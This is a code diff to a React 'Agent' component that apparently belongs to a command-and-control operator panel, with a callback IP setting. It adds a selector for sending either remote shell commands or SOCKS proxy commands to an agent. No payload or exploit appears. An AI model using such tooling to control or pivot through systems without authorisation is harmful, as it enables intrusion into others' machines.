@@ -18,6 +18,7 @@ const Agent = () => {
   const commandListRef = useRef(null);
   const [isAtBottom, setIsAtBottom] = useState(true);
   const prevCommandsRef = useRef([]);
+  const [newCommandType, setCommandType] = useState('shell');
 
   // States related to Configuration tab
   const [callbackIP, setCallbackIP] = useState('');
@@ -236,15 +237,15 @@ const Agent = () => {
         setError('Command cannot be empty');
         return;
       }
-
-      const commandBody = { commandType: "shell", command: newCommand };
+  
+      const commandBody = { commandType: newCommandType, command: newCommand };
       await axios.post(`/api/command/${queryParam}`, commandBody);
       setNewCommand('');
       fetchData();
     } catch (err) {
       setError('Failed to send command');
     }
-  };
+  };  
 
   const handleSaveConfiguration = async () => {
     try {
@@ -307,18 +308,32 @@ const Agent = () => {
           ))}
         </ul>
       )}
-      <div className="command-input">
+      <div className="command-input-container">
+        <select
+          value={newCommandType}
+          onChange={(e) => setCommandType(e.target.value)}
+          className="command-type-dropdown"
+        >
+          <option value="shell">Shell</option>
+          <option value="socks">Socks</option>
+        </select>
+  
         <input
           type="text"
-          placeholder="Enter command"
+          className="command-input"
+          placeholder={
+            newCommandType === 'socks' ? 'Enter port|disable' : 'Enter shell command'
+          }
           value={newCommand}
           onChange={(e) => setNewCommand(e.target.value)}
           onKeyDown={handleKeyPress}
         />
-        <button onClick={handleSendCommand}>Send</button>
+        <button onClick={handleSendCommand} className="send-command-button">
+          Send
+        </button>
       </div>
     </div>
-  );
+  );  
   
   const renderFilesTab = () => {
     return (
